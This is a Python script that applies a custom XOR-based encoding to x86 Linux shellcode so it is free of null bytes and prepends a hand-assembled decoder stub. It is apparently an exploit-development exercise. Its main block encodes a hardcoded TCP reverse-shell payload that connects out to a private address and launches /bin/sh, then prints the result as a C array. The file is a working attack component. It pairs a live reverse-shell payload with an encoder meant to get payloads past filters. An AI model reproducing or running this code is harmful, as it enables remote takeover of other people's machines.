#!/usr/bin/env python3

import sys
import random


def add_padding(shellcode):
    for i in range(4 - (len(shellcode) % 4)):
        shellcode.extend(b'\x90')

    print('[*] Shellcode length after padding: %s' % len(shellcode))
    return shellcode


def find_missing_bytes(shellcode):
    missing_bytes = bytearray()
    for b in range(0x01, 0xff):
        if shellcode.find(b) == -1:
            missing_bytes.append(b)
    
    if len(missing_bytes) > 0:
        print('[*] Found %s bytes not in shellcode' % len(missing_bytes))
    else:
        print('[*] No missing bytes found.')

    return missing_bytes


def process_decoder(shellcode):
    missing_bytes = find_missing_bytes(shellcode)
    if len(missing_bytes) == 0:
        print('[!] ERROR. The encoder is not able to process this shellcode')
        sys.exit(1)

    end_marker_byte = random.choice(shellcode)
    print('[*] End marker: 0x%02x' % end_marker_byte)
    
    dec_stub = bytearray(b''.join([
        b'\xeb\x43\x5e\x56\x5f\x31\xc0\x31\xdb\x31\xd2\x80\x3e',
        bytes([end_marker_byte]),
        b'\x74\x3a\x8a\x06\x80\x76\x01\xff\x8a\x5e\x01\x88\x1f',
        b'\x30\x46\x02\x8a\x5e\x02\x88\x5f\x01\x80\x76\x03\xff',
        b'\x8a\x5e\x03\x88\x5f\x02\x8a\x57\x01\x30\x46\x04\x30',
        b'\x56\x04\x8a\x5e\x04\x88\x5f\x03\x83\xc6\x05\x83\xc7',
        b'\x04\xeb\xc6\xe8\xb8\xff\xff\xff'
        ])
    )

    return dec_stub, end_marker_byte

def encode_sc(shellcode):
    encoded_sc_esc = ''
    encoded_sc_0x  = ''
    enc_shellcode = bytearray()
    orig_shellcode_len = len(shellcode)
    
    dec_stub, end_marker = process_decoder(shellcode)

    if len(shellcode) % 4 != 0:
        print('[*] Adding padding to shellcode so its 4-byte aligned ...')
        shellcode = add_padding(shellcode)

    print('[*] Encoding shellcode ...')
    for i in range(0, len(shellcode), 4):
        # Prepend random byte each chunk of 4 bytes
        randbyte = end_marker
        while randbyte == end_marker:
            randbyte = random.randrange(0x01, 0xff)
        enc_shellcode.append(randbyte)

        # Processing chunks
        enc_shellcode.append(shellcode[i] ^ 0xff)
        enc_shellcode.append(shellcode[i+1] ^ randbyte)
        enc_shellcode.append(shellcode[i+2] ^ 0xff)
        enc_shellcode.append(shellcode[i+3] ^ shellcode[i+1] ^ randbyte)


    print('[*] Appending 0x%02x marker at the end of the encoded shellcode' % end_marker)
    enc_shellcode.append(end_marker)

    print('[*] New shellcode length: %s' % len(enc_shellcode))
    inc_rate = -100 + (len(enc_shellcode)) * 100 / orig_shellcode_len
    print('[*] Increase rate: %.02f %%' % inc_rate)

    # Check null bytes
    if has_nulls(enc_shellcode):
        print('[!] WARNING. There are null bytes in the shellcode!')
    else:
        print('[*] SUCCESS! There are no null bytes in the encoded shellcode!')

    return dec_stub+enc_shellcode


def has_nulls(shellcode):
    if shellcode.find(0) != -1:
        return True
    else:
        return False


def print_shellcode(shellcode):
    print('')
    print('unsigned char code[] = (')
    for idx, b in enumerate(shellcode):
        if idx % 16 == 0:
            if idx:
                print('"')
            print('  "', end='')
        print('\\x%02x' % b, end='')
    print('"')
    print(');\n')


if __name__ == '__main__':

    # TCP reverse shell shellcode
    shellcode = bytearray(b''.join([
        b'\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66',
        b'\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0',
        b'\xa8\x38\x65\x68\x02\x00\x1b\x59\x89\xe1\xb0\x66\x50',
        b'\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73',
        b'\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0',
        b'\x0b\xcd\x80'
        ])
    )
    
    print('[*] Original shellcode lenght: %s' % len(shellcode))

    encoded_sc = encode_sc(shellcode)
    print_shellcode(encoded_sc)
